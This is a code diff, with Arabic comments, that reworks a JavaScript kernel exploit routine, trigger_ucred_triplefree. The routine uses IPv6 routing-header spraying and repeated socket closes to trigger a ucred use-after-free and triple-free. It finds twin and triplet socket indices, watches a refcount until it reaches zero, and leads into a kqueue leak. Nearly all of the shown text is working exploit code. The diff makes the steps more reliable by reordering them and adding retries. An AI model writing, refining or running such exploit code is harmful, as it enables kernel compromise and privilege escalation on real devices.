@@ -1354,7 +1354,7 @@ function trigger_ucred_triplefree() {
     send_notification("[STEP 7] First double-close");
     close(dup(new BigInt(uaf_socket)));
 
-    // STEP 8
+    // STEP 8 — إيجاد التوينز
     send_notification("[STEP 8] Finding twins...");
     end = find_twins();
     send_notification("[STEP 8] find_twins returned end=" + end +
@@ -1368,11 +1368,11 @@ function trigger_ucred_triplefree() {
       continue;
     }
 
-    // STEP 9
+    // STEP 9 — تحرير التوين الثاني
     send_notification("[STEP 9] Freeing twin index=" + twins[1]);
     free_rthdr(ipv6_socks[twins[1]]);
 
-    // STEP 10 — مراقبة refcount بشرط ref<=0 بدون كسر الفلو
+    // STEP 10 — مراقبة refcount
     send_notification("[STEP 10] Monitoring refcount on twin=" + twins[0]);
 
     var count = 0;
@@ -1394,16 +1394,14 @@ function trigger_ucred_triplefree() {
       var ref = read32(leak_rthdr);
       last_ref = ref;
 
-      // أول قراءة
       if (first_ref === -1) {
         first_ref = ref;
       }
 
-      // الشرط الحقيقي — ref <= 0
       if (ref <= 0) {
         send_notification("[STEP 10] REF SUCCESS HIT (ref <= 0)");
         ref_success = true;
-        break;   // 👈 خروج من STEP 10 فقط
+        break;
       }
 
       send_notification(
@@ -1420,33 +1418,40 @@ function trigger_ucred_triplefree() {
       " | last_ref=" + last_ref
     );
 
+    if (!ref_success) {
+      send_notification("[STEP 10] ref_success=false → CONTINUE LOOP");
+      close(new BigInt(uaf_socket));
+      continue;
+    }
 
-    // STEP 11
-    close(dup(new BigInt(uaf_socket)));
-    send_notification("[STEP 11] triple-close executed");
-    send_notification("[DEBUG] ENTERED STEP 11");
+    // STEP 11 (جديد) — تجهيز التريبلت قبل أي close إضافي
+    send_notification("[STEP 11] Preparing triplets from twins");
+    triplets[0] = twins[0];
 
-    // STEP 12
+    // STEP 12 — إيجاد التريبلت الأول
     triplets[1] = find_triplet(triplets[0], -1);
-
     if (triplets[1] === -1) {
       send_notification("[STEP 12] triplet1 NOT FOUND → CONTINUE LOOP");
+      close(new BigInt(uaf_socket));
       continue;
     }
-
     send_notification("[STEP 12] triplet1 FOUND = " + triplets[1]);
 
-    // STEP 13
+    // STEP 13 — إيجاد التريبلت الثاني
     triplets[2] = find_triplet(triplets[0], triplets[1]);
-
     if (triplets[2] === -1) {
       send_notification("[STEP 13] triplet2 NOT FOUND → CONTINUE LOOP");
+      close(new BigInt(uaf_socket));
       continue;
     }
-
     send_notification("[STEP 13] triplet2 FOUND = " + triplets[2]);
 
+    // STEP 14 — دلوقتي بس نعمل الـ triple-close
+    close(dup(new BigInt(uaf_socket)));
+    send_notification("[STEP 14] triple-close executed");
+    send_notification("[DEBUG] ENTERED STEP 14");
 
+    // STEP 15 — قراءة بعد الفلو
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
 
@@ -1462,6 +1467,7 @@ function trigger_ucred_triplefree() {
   send_notification("[END] Flow completed → SUCCESS");
   return true;
 }
+
 
 function leak_kqueue() {
   debug('Leaking kqueue...');
